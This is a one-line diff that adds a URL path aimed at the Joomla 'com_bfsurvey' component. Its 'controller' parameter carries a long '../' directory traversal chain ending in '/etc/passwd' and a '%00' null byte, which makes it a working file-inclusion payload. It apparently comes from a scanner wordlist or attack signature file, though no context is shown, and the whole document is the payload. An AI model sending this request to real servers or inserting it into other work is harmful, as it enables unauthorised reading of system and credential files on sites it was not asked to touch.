@@ -1,0 +1,1 @@
+/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00
